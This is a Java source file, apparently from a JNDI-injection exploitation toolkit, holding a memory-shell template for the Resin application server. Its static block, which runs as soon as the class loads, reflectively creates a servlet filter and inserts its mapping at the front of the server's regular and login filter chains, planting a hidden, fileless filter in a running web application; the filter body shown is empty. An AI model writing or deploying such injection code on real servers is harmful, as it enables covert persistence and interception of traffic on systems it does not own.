package com.nu1r.jndi.template.resin;

import com.caucho.server.dispatch.FilterConfigImpl;
import com.caucho.server.dispatch.FilterMapper;
import com.caucho.server.dispatch.FilterMapping;
import com.caucho.server.webapp.WebApp;

import javax.servlet.*;
import java.lang.reflect.Field;
import java.util.ArrayList;

public class RFMSFromThreadF implements Filter{
    public static String pattern;

    static {
        try {
            String filterName = String.valueOf(System.nanoTime());

            ClassLoader classloader = Thread.currentThread().getContextClassLoader();

            Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
            Class filterConfigimplcls  = classloader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
            Class filterMappingcls     = classloader.loadClass("com.caucho.server.dispatch.FilterMapping");
            Class filterMappercls      = classloader.loadClass("com.caucho.server.dispatch.FilterMapper");

            Object contextRequest = servletInvocationcls.getMethod("getContextRequest").invoke(null);
            WebApp webapp         = (WebApp) contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);

            Filter filter = new RFMSFromThreadF();

            FilterConfigImpl filterConfigimpl = (FilterConfigImpl) filterConfigimplcls.newInstance();
            filterConfigimpl.setFilterName(filterName);
            filterConfigimpl.setFilter(filter);
            filterConfigimpl.setFilterClass(filter.getClass());

            webapp.addFilter(filterConfigimpl);

            FilterMapping            filterMapping           = (FilterMapping) filterMappingcls.newInstance();
            FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();
            filterMappingUrlpattern.addText(pattern);
            filterMappingUrlpattern.init();
            filterMapping.setFilterName(filterName);
            filterMapping.setServletContext(webapp);


            //set filterMapper
            Field fieldWebappFilterMapper = null;
            try {
                fieldWebappFilterMapper = webapp.getClass().getDeclaredField("_filterMapper");
            } catch (NoSuchFieldException Exception) {
                fieldWebappFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");
            }

            fieldWebappFilterMapper.setAccessible(true);
            FilterMapper filtermapper = (FilterMapper) fieldWebappFilterMapper.get(webapp);

            Field fieldFilterMapperFilterMap = filterMappercls.getDeclaredField("_filterMap");
            fieldFilterMapperFilterMap.setAccessible(true);

            ArrayList<FilterMapping> orginalfilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(filtermapper);
            ArrayList<FilterMapping> newFilterMappings     = new ArrayList(orginalfilterMappings.size() + 1);
            newFilterMappings.add(filterMapping);

            int count = 0;
            while (count < orginalfilterMappings.size()) {
                newFilterMappings.add(orginalfilterMappings.get(count));
                ++count;
            }

            fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);
            fieldWebappFilterMapper.set(webapp, filtermapper);

            //set loginFilterMapper
            Field fieldWebappLoginFilterMapper = null;
            try {
                fieldWebappLoginFilterMapper = webapp.getClass().getDeclaredField("_loginFilterMapper");
            } catch (NoSuchFieldException Exception) {
                fieldWebappLoginFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_loginFilterMaper");
            }

            fieldWebappLoginFilterMapper.setAccessible(true);
            FilterMapper loginFilterMapper = (FilterMapper) fieldWebappLoginFilterMapper.get(webapp);

            ArrayList<FilterMapping> orginLoginFilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(loginFilterMapper);
            ArrayList<FilterMapping> newLoginFilterMappings   = new ArrayList(orginLoginFilterMappings.size() + 1);
            newLoginFilterMappings.add(filterMapping);

            count = 0;
            while (count < orginLoginFilterMappings.size()) {
                newLoginFilterMappings.add(orginLoginFilterMappings.get(count));
                ++count;
            }

            fieldFilterMapperFilterMap.set(loginFilterMapper, newLoginFilterMappings);
            fieldWebappLoginFilterMapper.set(webapp, loginFilterMapper);

            webapp.getClass().getMethod("clearCache").invoke(webapp);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
    }

    @Override
    public void destroy() {
    }
}
